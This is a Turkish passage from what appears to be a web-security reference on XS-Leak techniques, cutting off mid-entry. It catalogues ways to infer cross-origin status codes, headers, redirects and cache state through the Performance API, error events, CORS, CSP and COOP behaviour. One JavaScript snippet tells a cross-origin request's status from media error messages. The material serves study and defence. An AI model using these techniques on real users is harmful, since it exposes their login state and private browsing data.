[`Performans API`](https://developer.mozilla.org/en-US/docs/Web/API/Performance), web uygulamalarının performans metriklerine dair içgörüler sunar ve bu içgörüler [`Resource Timing API`](https://developer.mozilla.org/en-US/docs/Web/API/Resource\_Timing\_API) tarafından daha da zenginleştirilir. Resource Timing API, ağ isteği zamanlamalarının detaylı izlenmesini sağlar, örneğin isteklerin süresi gibi. Sunucuların yanıtlarında `Timing-Allow-Origin: *` başlığını içermesi durumunda, transfer boyutu ve alan arama süresi gibi ek veriler de erişilebilir hale gelir.

Bu zengin veri, [`performance.getEntries`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntries) veya [`performance.getEntriesByName`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntriesByName) gibi yöntemler aracılığıyla alınabilir ve performansla ilgili bilgilerin kapsamlı bir görünümünü sağlar. Ayrıca, API, [`performance.now()`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) ile elde edilen zaman damgaları arasındaki farkı hesaplayarak yürütme sürelerinin ölçülmesini kolaylaştırır. Ancak, belirli işlemler için Chrome gibi tarayıcılarda `performance.now()`'ın hassasiyeti milisaniyelere sınırlı olabilir, bu da zamanlama ölçümlerinin ayrıntısını etkileyebilir.

Zamanlama ölçümlerinin ötesinde, Performans API, güvenlikle ilgili içgörüler için de kullanılabilir. Örneğin, Chrome'da `performance` nesnesinde sayfaların varlığı veya yokluğu, `X-Frame-Options`'ın uygulanıp uygulanmadığını gösterebilir. Özellikle, bir sayfa `X-Frame-Options` nedeniyle bir çerçevede oluşturulmaktan engellendiğinde, bu sayfa `performance` nesnesinde kaydedilmez, sayfanın çerçevelendirme politikaları hakkında ince bir ipucu sağlar.

### Hata Sızıntısı

* **Dahil Etme Yöntemleri**: Çerçeveler, HTML Öğeleri
* **Algılanabilir Fark**: Durum Kodu
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Özet:** Hatalara neden olan bir istek, bir kaynak zamanlama girdisi oluşturmaz.
* **Kod Örneği**: [https://xsinator.com/testing.html#Performance%20API%20Error%20Leak](https://xsinator.com/testing.html#Performance%20API%20Error%20Leak)

Bir **hata** oluşturan istekler, bir **performans girdisi oluşturmaz** ve bu nedenle **HTTP yanıt durum kodları arasında farklılık** yapılabilir.

### Stil Yeniden Yükleme Hatası

* **Dahil Etme Yöntemleri**: HTML Öğeleri
* **Algılanabilir Fark**: Durum Kodu
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Özet:** Bir tarayıcı hatası nedeniyle, hatalara neden olan istekler iki kez yüklenir.
* **Kod Örneği**: [https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak](https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak)

Önceki teknikte, GC'deki tarayıcı hataları nedeniyle **yüklenemeyen kaynakların iki kez yüklendiği** iki durum belirlendi. Bu, Performans API'da birden fazla giriş oluşturur ve bu nedenle algılanabilir.

### İstek Birleştirme Hatası

* **Dahil Etme Yöntemleri**: HTML Öğeleri
* **Algılanabilir Fark**: Durum Kodu
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Özet:** Hata oluşturan istekler birleştirilemez.
* **Kod Örneği**: [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

Teknik, belirtilen makalede bir tabloda bulundu ancak teknikle ilgili bir açıklama bulunamadı. Bununla birlikte, bu tekniği kontrol eden kaynak kodu [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak) adresinde bulabilirsiniz.

### Boş Sayfa Sızıntısı

* **Dahil Etme Yöntemleri**: Çerçeveler
* **Algılanabilir Fark**: Sayfa İçeriği
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Özet:** Boş yanıtlar, kaynak zamanlama girdileri oluşturmaz.
* **Kod Örneği**: [https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak](https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak)

Bir saldırgan, bazı tarayıcılarda **boş sayfaların performans girdisi oluşturmadığını** tespit edebilir, böylece **boş sayfaların** bir performans girdisi oluşturmadığını anlayabilir.

### **XSS-Auditor Sızıntısı**

* **Dahil Etme Yöntemleri**: Çerçeveler
* **Algılanabilir Fark**: Sayfa İçeriği
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Özet:** Güvenlik Bildirimlerinde (SA) XSS Denetleyici kullanarak, saldırganlar, oluşturulan yüklerin denetleyicinin filtreleme mekanizmasını tetiklediğinde yanıtlarda değişiklikler gözlemleyerek belirli web sayfası öğelerini tespit edebilir.
* **Kod Örneği**: [https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak](https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak)

Güvenlik Bildirimlerinde (SA), XSS Denetleyici, başlangıçta XSS saldırılarını önlemek için tasarlanmış olmasına rağmen, paradoksal bir şekilde hassas bilgilerin sızdırılmasında kullanılabilir. Bu yerleşik özellik Google Chrome (GC) 'dan kaldırıldı, ancak SA'da hala mevcut. 2013 yılında, Braun ve Heiderich, XSS Denetleyicinin yanlışlıkla meşru betikleri engelleyebileceğini ve yanlış pozitiflere yol açabileceğini gösterdi. Buna dayanarak, araştırmacılar, hassas bilgileri çıkarmak ve çapraz kökenli sayfalarda belirli içeriği tespit etmek için teknikler geliştirdiler, bu kavrama Terada tarafından başlangıçta bildirilen ve Heyes tarafından bir blog yazısında ayrıntılı olarak açıklanan XS-Sızıntıları olarak bilinir. Bu teknikler GC'deki XSS Denetleyicisi için özeldi, ancak SA'da, XSS Denetleyicisi tarafından engellenen sayfaların Performans API'da giriş oluşturmadığını keşfedildi, bu da hassas bilgilerin hala sızdırılabileceği bir yöntemi ortaya koydu.

### X-Frame Sızıntısı

* **Dahil Etme Yöntemleri**: Çerçeveler
* **Algılanabilir Fark**: Başlık
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2), [https://xsleaks.github.io/xsleaks/examples/x-frame/index.html](https://xsleaks.github.io/xsleaks/examples/x-frame/index.html), [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options)
* **Özet:** X-Frame-Options başlığına sahip kaynak, bir kaynak zamanlama girdisi oluşturmaz.
* **Kod Örneği**: [https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak](https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak)

Bir sayfanın bir **iframe** içinde **çerçevelenmesine izin verilmediğinde**, bir **performans girdisi oluşturulmaz**. Sonuç olarak, bir saldırgan, yanıt başlığı **`X-Frame-Options`**'ı tespit edebilir.\
Aynı durum **embed** **etiketi kullanıldığında** da geçerlidir.

### İndirme Tespiti

* **Dahil Etme Yöntemleri**: Çerçeveler
* **Algılanabilir Fark**: Başlık
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Özet:** İndirmeler, Performans API'da kaynak zamanlama girdisi oluşturmaz.
* **Kod Örneği**: [https://xsinator.com/testing.html#Performance%20API%20Download%20Detection](https://xsinator.com/testing.html#Performance%20API%20Download%20Detection)

Tanımlanan XS-Sızıntıya benzer şekilde, bir **kaynak indirildiğinde** ContentDisposition başlığı nedeniyle, ayrıca bir **performans girdisi oluşturmaz**. Bu teknik tüm ana tarayıcılarda çalışır.
### Yönlendirme Başlangıç Sızıntısı

* **Dahil Etme Yöntemleri**: Çerçeveler
* **Algılanabilir Fark**: Yönlendirme
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Özet:** Bir yönlendirme başlangıç zamanını sızdırır.
* **Kod Örneği**: [https://xsinator.com/testing.html#Redirect%20Start%20Leak](https://xsinator.com/testing.html#Redirect%20Start%20Leak)

Bazı tarayıcıların davranışlarını kötüye kullanan bir XS-Leak örneği bulduk. Standart, çapraz kaynak istekleri için belirli özniteliklerin sıfıra ayarlanması gerektiğini tanımlar. Ancak, **SA**'da, hedef sayfanın kullanıcıyı **yönlendirdiği** tespit edilebilir, **Performans API**'sini sorgulayarak ve **redirectStart zamanlama verilerini** kontrol ederek.

### Yönlendirme Süresi Sızıntısı

* **Dahil Etme Yöntemleri**: Fetch API
* **Algılanabilir Fark**: Yönlendirme
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Özet:** Bir yönlendirme gerçekleştiğinde zamanlama girişlerinin süresi negatif olur.
* **Kod Örneği**: [https://xsinator.com/testing.html#Duration%20Redirect%20Leak](https://xsinator.com/testing.html#Duration%20Redirect%20Leak)

GC'de, bir **yönlendirme** ile sonuçlanan isteklerin **süresi negatif** olur ve bu nedenle yönlendirme olmayan isteklerden **ayırt edilebilir**.

### CORP Sızıntısı

* **Dahil Etme Yöntemleri**: Çerçeveler
* **Algılanabilir Fark**: Başlık
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Özet:** CORP ile korunan kaynaklar, kaynak zamanlama girişleri oluşturmaz.
* **Kod Örneği**: [https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak](https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak)

Bazı durumlarda, **nextHopProtocol girişi** bir sızıntı tekniği olarak kullanılabilir. GC'de, **CORP başlığı** ayarlandığında, nextHopProtocol **boş** olacaktır. CORP etkin kaynaklar için SA hiçbir performans girişi oluşturmayacaktır.

### Hizmet İşçisi

* **Dahil Etme Yöntemleri**: Çerçeveler
* **Algılanabilir Fark**: API Kullanımı
* **Daha Fazla Bilgi**: [https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/](https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/)
* **Özet:** Belirli bir köken için bir hizmet işçisinin kaydedilip edilmediğini tespit et.
* **Kod Örneği**:

Hizmet işçileri, bir kökende çalışan olaya dayalı betik bağlamlarıdır. Bir web sayfasının arka planında çalışırlar ve kaynakları **ön belleğe almak** için araya girebilir, değiştirebilir ve **ön belleğe alabilirler**.\
Bir **hizmet işçisi** tarafından **ön belleğe alınan bir kaynak** **iframe** aracılığıyla erişilirse, kaynak **hizmet işçisi önbelleğinden yüklenecektir**.\
Kaynağın **hizmet işçisi önbelleğinden yüklendiğini** tespit etmek için **Performans API** kullanılabilir.\
Bu ayrıca bir Zamanlama saldırısı ile de yapılabilir (daha fazla bilgi için belgeye bakın).

### Önbellek

* **Dahil Etme Yöntemleri**: Fetch API
* **Algılanabilir Fark**: Zamanlama
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)
* **Özet:** Bir kaynağın önbelleğe alınıp alınmadığını kontrol etmek mümkündür.
* **Kod Örneği**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources), [https://xsinator.com/testing.html#Cache%20Leak%20(POST)](https://xsinator.com/testing.html#Cache%20Leak%20\(POST\))

[Performans API](./#performance-api) kullanılarak bir kaynağın önbelleğe alınıp alınmadığı kontrol edilebilir.

### Ağ Süresi

* **Dahil Etme Yöntemleri**: Fetch API
* **Algılanabilir Fark**: Sayfa İçeriği
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)
* **Özet:** Bir isteğin ağ süresi `performans` API'sinden alınabilir.
* **Kod Örneği**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)

## Hata Mesajları Tekniği

### Medya Hatası

* **Dahil Etme Yöntemleri**: HTML Öğeleri (Video, Ses)
* **Algılanabilir Fark**: Durum Kodu
* **Daha Fazla Bilgi**: [https://bugs.chromium.org/p/chromium/issues/detail?id=828265](https://bugs.chromium.org/p/chromium/issues/detail?id=828265)
* **Özet:** Firefox'ta çapraz kökenli bir isteğin durum kodunu doğru bir şekilde sızdırmak mümkündür.
* **Kod Örneği**: [https://jsbin.com/nejatopusi/1/edit?html,css,js,output](https://jsbin.com/nejatopusi/1/edit?html,css,js,output)
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false);
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg;
}

function startup() {
let audioElement = document.getElementById("audio");
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener("click", function() {
audioElement.src = document.getElementById("testUrl").value;
}, false);
// Create the event handler
var errHandler = function() {
let err = this.error;
let message = err.message;
let status = "";

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if((message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1) || (message.indexOf("Failed to init decoder") != -1)){
status = "Success";
}else{
status = "Error";
}
displayErrorMessage("<strong>Status: " + status + "</strong> (Error code:" + err.code + " / Error Message: " + err.message + ")<br>");
};
audioElement.onerror = errHandler;
}
```
### CORS Hatası

* **Dahil Etme Yöntemleri**: Fetch API
* **Algılanabilir Fark**: Başlık
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Özet:** Güvenlik İddialarında (SA), CORS hata mesajları yanlışlıkla yönlendirilen isteklerin tam URL'sini açığa çıkarır.
* **Kod Örneği**: [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

Bu teknik, bir saldırganın Webkit tabanlı tarayıcıların CORS isteklerini nasıl ele aldığını sömürerek **çapraz kaynak sitenin yönlendirme hedefini çıkarmasına** olanak tanır. Özellikle, bir **CORS etkin istek**, kullanıcı durumuna dayalı olarak bir yönlendirme yapan hedef siteye gönderildiğinde ve tarayıcı daha sonra isteği reddettiğinde, hata mesajı içinde **yönlendirmenin tam URL'si** ifşa edilir. Bu zayıflık sadece yönlendirme gerçeğini ortaya çıkarmakla kalmaz, aynı zamanda yönlendirmenin uç noktasını ve içerebileceği **duyarlı sorgu parametrelerini** de açığa çıkarır.

### SRI Hatası

* **Dahil Etme Yöntemleri**: Fetch API
* **Algılanabilir Fark**: Başlık
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Özet:** Güvenlik İddialarında (SA), CORS hata mesajları yanlışlıkla yönlendirilen isteklerin tam URL'sini açığa çıkarır.
* **Kod Örneği**: [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

Bir saldırgan, **aşırı detaylı hata mesajlarını** kullanarak çapraz kaynak yanıtlarının boyutunu çıkarmak için SRI mekanizmasını sömürebilir. Bu, kaynakların, genellikle CDN'lerden alınan, değiştirilmediğini doğrulamak için bütünlük özniteliğini kullanan Subresource Integrity (SRI) mekanizmasından kaynaklanmaktadır. SRI'nin çapraz kaynak kaynakları üzerinde çalışması için bunların **CORS etkin** olması gerekir; aksi takdirde bütünlük kontrollerine tabi değillerdir. Güvenlik İddialarında (SA), CORS hatası XS-Leak gibi, bir bütünlük özniteliği başarısız olduğunda bir alınan istek sonrasında bir hata mesajı yakalanabilir. Saldırganlar, herhangi bir isteğin bütünlük özniteliğine **sahte bir kripto değeri atayarak** bu hatayı kasıtlı olarak **tetikleyebilir**. SA'da, ortaya çıkan hata mesajı yanlışlıkla istenen kaynağın içerik uzunluğunu ifşa eder. Bu bilgi sızıntısı, bir saldırganın yanıt boyutundaki değişiklikleri ayırt etmesine olanak tanır, bu da sofistike XS-Leak saldırıları için yol açar.

### CSP İhlali/Tespiti

* **Dahil Etme Yöntemleri**: Açılır Pencereler
* **Algılanabilir Fark**: Durum Kodu
* **Daha Fazla Bilgi**: [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
* **Özet:** CSP yalnızca kurbanın web sitesine izin verirse ve farklı bir etki alanına yönlendirmeye çalışırsa CSP, algılanabilir bir hataya neden olur.
* **Kod Örneği**: [https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

Bir XS-Leak, CSP'yi kullanarak çapraz kaynak bir sitenin farklı bir kökene yönlendirilip yönlendirilmediğini tespit edebilir. Bu sızıntı, yönlendirmeyi tespit edebilir, ancak ayrıca yönlendirme hedefinin etki alanı da sızar. Bu saldırının temel fikri, **saldırgan sitesindeki hedef etki alanına izin vermek**tir. Bir istek hedef etki alana gönderildiğinde, **çapraz kaynak bir etki alana yönlendirilir**. **CSP**, buna erişimi engeller ve bir sızıntı tekniği olarak kullanılan bir **ihlal raporu oluşturur**. Tarayıcıya bağlı olarak, **bu rapor yönlendirmenin hedef konumunu sızdırabilir**.\
Modern tarayıcılar yönlendirildiği URL'yi belirtmeyebilir, ancak hala bir çapraz kaynak yönlendirmesinin tetiklendiğini tespit edebilirsiniz.

### Önbellek

* **Dahil Etme Yöntemleri**: Çerçeveler, Açılır Pencereler
* **Algılanabilir Fark**: Sayfa İçeriği
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events), [https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html](https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html)
* **Özet:** Önbellekten dosyayı temizleyin. Hedef sayfayı açın, dosyanın önbellekte olup olmadığını kontrol edin.
* **Kod Örneği:**

Tarayıcılar tüm web siteleri için ortak bir önbellek kullanabilir. Kökenlerinden bağımsız olarak, bir hedef sayfanın **belirli bir dosyayı isteyip istemediğini** çıkarabilirsiniz.

Bir sayfa yalnızca kullanıcı giriş yaptığında bir resmi yüklüyorsa, **kaynağı geçersiz kılabilirsiniz** (eğer önbellekteyse artık önbellekte değilse, daha fazla bilgi için bağlantılara bakın), o kaynağı yükleyebilecek bir isteği **gerçekleştirin** ve kaynağı **kötü bir istekle yüklemeye çalışın** (örneğin, aşırı uzun bir başvuru başlığı kullanarak). Kaynak yükleme **herhangi bir hata tetiklemediyse**, bu, kaynağın **önbelleğe alındığı** anlamına gelir.

### CSP Yönergesi

* **Dahil Etme Yöntemleri**: Çerçeveler
* **Algılanabilir Fark**: Başlık
* **Daha Fazla Bilgi**: [https://bugs.chromium.org/p/chromium/issues/detail?id=1105875](https://bugs.chromium.org/p/chromium/issues/detail?id=1105875)
* **Özet:** CSP başlık yönergeleri, CSP iframe özniteliğini kullanarak sorgulanabilir ve politika ayrıntıları ortaya çıkarılabilir.
* **Kod Örneği**: [https://xsinator.com/testing.html#CSP%20Directive%20Leak](https://xsinator.com/testing.html#CSP%20Directive%20Leak)

Google Chrome'da (GC) yeni bir özellik, bir iframe öğesinde bir öznitelik ayarlayarak web sayfalarının **Bir İçerik Güvenlik Politikası (CSP)** önermesine izin verir ve politika yönergeleri HTTP isteği ile iletilir. Normalde, gömülü içerik bunu **bir HTTP başlığı aracılığıyla yetkilendirmelidir**, aksi takdirde bir **hata sayfası görüntülenir**. Ancak, eğer iframe zaten bir CSP tarafından yönetiliyorsa ve yeni önerilen politika daha kısıtlayıcı değilse, sayfa normal şekilde yüklenir. Bu mekanizma, bir saldırganın çapraz kökenli bir sayfanın belirli CSP yönergelerini **belirlemesine olanak tanır** ve hata sayfasını tanımlayabilir. Bu zayıflık düzeltilmiş olarak işaretlendi, ancak bulgularımız, hata sayfasını tespit edebilen **yeni bir sızıntı tekniğini** ortaya çıkarır ve temel sorunun asla tam olarak çözülmediğini öne sürer.

### **CORP**

* **Dahil Etme Yöntemleri**: Fetch API
* **Algılanabilir Fark**: Başlık
* **Daha Fazla Bilgi**: [**https://xsleaks.dev/docs/attacks/browser-features/corp/**](https://xsleaks.dev/docs/attacks/browser-features/corp/)
* **Özet:** Cross-Origin Resource Policy (CORP) ile korunan kaynaklar, yasaklanan bir kökenden alındığında bir hata fırlatır.
* **Kod Örneği**: [https://xsinator.com/testing.html#CORP%20Leak](https://xsinator.com/testing.html#CORP%20Leak)

CORP başlığı, belirli bir kaynağa **no-cors çapraz köken isteklerini engellediğinde bir hata fırlatır** ve bu nedenle başlığın varlığı algılanabilir.
### CORB

* **Dahil Etme Yöntemleri**: HTML Elemanları
* **Algılanabilir Fark**: Başlıklar
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
* **Özet**: CORB saldırganlara istekte **`nosniff` başlığının varlığını** tespit etmelerine olanak tanıyabilir.
* **Kod Örneği**: [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

Saldırı hakkında daha fazla bilgi için bağlantıya bakın.

### CORS hatası Origin Yansıma yanlış yapılandırma <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

* **Dahil Etme Yöntemleri**: Fetch API
* **Algılanabilir Fark**: Başlıklar
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
* **Özet**: Eğer Origin başlığı `Access-Control-Allow-Origin` başlığında yansıtılıyorsa, bir kaynağın önbellekte olup olmadığını kontrol etmek mümkündür.
* **Kod Örneği**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

Eğer **Origin başlığı**, `Access-Control-Allow-Origin` başlığında **yansıtılıyorsa**, bir saldırgan bu davranışı kötüye kullanarak **CORS** modunda **kaynağı almaya çalışabilir**. Eğer bir **hata oluşmazsa**, bu kaynağın **web'den doğru şekilde alındığı** anlamına gelir, eğer bir hata **oluşursa**, bu kaynağın **önbellekten alındığı** anlamına gelir (hata, önbelleğin, orijinal alanı izin veren bir CORS başlığıyla bir yanıtı kaydettiği için ortaya çıkar).\
Unutulmalıdır ki, eğer origin yansıtılmıyorsa ancak joker karakteri kullanılıyorsa (`Access-Control-Allow-Origin: *`), bu işe yaramayacaktır.

## Okunabilir Özellikler Tekniği

### Fetch Yönlendirme

* **Dahil Etme Yöntemleri**: Fetch API
* **Algılanabilir Fark**: Durum Kodu
* **Daha Fazla Bilgi**: [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
* **Özet:** GC ve SA, yönlendirme tamamlandıktan sonra yanıtın türünü (opaqueredirect) kontrol etmeye olanak tanır.
* **Kod Örneği**: [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

`redirect: "manual"` ve diğer parametrelerle Fetch API kullanarak bir istek göndererek, `response.type` özelliğini okumak ve eğer `opaqueredirect`'e eşitse, yanıtın bir yönlendirme olduğunu belirlemek mümkündür.

### COOP

* **Dahil Etme Yöntemleri**: Açılır Pencereler
* **Algılanabilir Fark**: Başlık
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
* **Özet:** Cross-Origin Opener Policy (COOP) tarafından korunan sayfalar, çapraz köken etkileşimlerden erişimi engeller.
* **Kod Örneği**: [https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)

Bir saldırgan, çapraz kökenli bir HTTP yanıtında Cross-Origin Opener Policy (COOP) başlığının varlığını çıkarabilir. COOP, harici sitelerin rastgele pencere referanslarına erişmesini engellemek için web uygulamaları tarafından kullanılır. Bu başlığın görünürlüğü, **`contentWindow` referansına** erişmeye çalışarak anlaşılabilir. COOP koşullu olarak uygulandığında, **`opener` özelliği** belirleyici bir işaret haline gelir: COOP etkin olduğunda **tanımsız** olurken, yokluğunda **tanımlı** olur.

### URL Maksimum Uzunluğu - Sunucu Tarafı

* **Dahil Etme Yöntemleri**: Fetch API, HTML Elemanları
* **Algılanabilir Fark**: Durum Kodu / İçerik
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
* **Özet:** Sunucu tarafından yönlendirme yanıtının uzunluğundan kaynaklanan farkları tespit etmek, sunucunun bir hata ile yanıt vermesine ve bir uyarı oluşturulmasına neden olabilir.
* **Kod Örneği**: [https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

Sunucu tarafından yönlendirme yapılırken **yönlendirme içinde kullanıcı girdisi** ve **ekstra veri** kullanılıyorsa, genellikle **sunucuların bir istek uzunluğu sınırı** vardır. Eğer **kullanıcı verisi** bu **uzunluk - 1** ise, çünkü **yönlendirme** bu veriyi kullanıyor ve **ekstra bir şey ekliyorsa**, bir **hata Error Events aracılığıyla algılanabilir** şekilde tetiklenecektir.

Eğer bir kullanıcıya çerezler atayabilirseniz, bu saldırıyı **yeterli çerezler atayarak** da gerçekleştirebilirsiniz ([**çerez bombası**](../hacking-with-cookies/cookie-bomb.md)) böylece **doğru yanıtın boyutu arttığında** bir **hata** tetiklenir. Bu durumda, bu isteği aynı siteden tetiklerseniz, `<script>` otomatik olarak çerezleri gönderir (bu nedenle hataları kontrol edebilirsiniz).\
**Çerez bombası + XS-Search**'ün bir örneği, bu yazının amaçlanan çözümünde bulunabilir: [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended)

Bu tür bir saldırı için genellikle `SameSite=None` veya aynı bağlamda olmak gereklidir.

### URL Maksimum Uzunluğu - İstemci Tarafı

* **Dahil Etme Yöntemleri**: Açılır Pencereler
* **Algılanabilir Fark**: Durum Kodu / İçerik
* **Daha Fazla Bilgi**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)
* **Özet:** Yönlendirme yanıtının uzunluğu isteğin çok büyük olması nedeniyle fark edilebilecek bir fark yaratabilir.
* **Kod Örneği**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)

[Chromium belgelerine](https://chromium.googlesource.com/chromium/src/+/main/docs/security/url\_display\_guidelines/url\_display\_guidelines.md#URL-Length) göre, Chrome'un maksimum URL uzunluğu 2MB'dir.

> Genel olarak, _web platformu_ URL'lerin uzunluğuna sınırlama getirmez (ancak 2^31 yaygın bir sınırdır). _Chrome_, uygulama arasında hizmet reddi sorunlarına neden olmamak ve pratik nedenlerle URL'leri maksimum **2MB** uzunluğunda sınırlar.

Bu nedenle, eğer **yönlendirme URL'si bir durumda daha büyükse**, URL'nin **2MB'den büyük bir uzunluğa sahip olacak şekilde yönlendirilmesi** mümkündür. Bu gerçekleştiğinde, Chrome bir **`about:blank#blocked`** sayfası gösterir.

**Fark edilebilir fark**, eğer **yönlendirme** tamamlandıysa, `window.origin` bir **hata fırlatır** çünkü çapraz köken bu bilgiye erişemez. Ancak, **limit** aşıldığında ve yüklenen sayfa **`about:blank#blocked`** ise pencerenin **`origin`**'i **ana sayfanın**ki olarak kalır, bu da **erişilebilir bir bilgidir.**

**2MB'ye** ulaşmak için gereken tüm ek bilgiler, başlangıçtaki URL'de bir **hash** ile eklenerek yönlendirmede **kullanılabilir**.
### Maksimum Yönlendirmeler

* **Dahil Etme Yöntemleri**: Fetch API, Frames
* **Algılanabilir Fark**: Durum Kodu
